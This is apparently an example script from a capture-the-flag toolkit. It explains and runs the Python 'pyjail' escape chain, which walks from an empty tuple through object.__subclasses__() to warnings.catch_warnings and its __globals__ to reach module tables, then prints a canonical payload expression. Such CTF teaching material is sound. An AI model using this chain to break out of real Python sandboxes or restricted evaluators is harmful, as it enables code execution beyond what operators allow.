#!/usr/bin/env python3
"""The object-introspection chain: the pyjail backbone.

Even with no builtins, any object reaches every loaded class through the type
graph:

    ().__class__                 -> tuple
    .__bases__[0]                -> object (the root of every class)
    .__subclasses__()            -> every class CPython has loaded

Somewhere in that list is a class whose methods' ``__globals__`` expose a
dangerous module (``os``, ``subprocess``). You walk to it and borrow its
import machinery. :func:`ctfkit.web.object_chain_payload` prints the canonical
expression; here we actually run the walk to prove it finds a useful class.
"""
from ctfkit.web import object_chain_payload

subclasses = ().__class__.__bases__[0].__subclasses__()
print("loaded subclasses:", len(subclasses))

# Find a class whose __init__ globals import os (warnings.catch_warnings is the
# classic one). We only look it up; we do not execute anything dangerous.
hits = [c for c in subclasses if "catch_warnings" in c.__name__]
print("candidate:", hits[0].__name__ if hits else "none found")

if hits:
    g = hits[0].__init__.__globals__
    print("has a module table via __globals__:", "sys" in g or "__builtins__" in g)

print("canonical payload expr:")
print(" ", object_chain_payload("catch_warnings"))
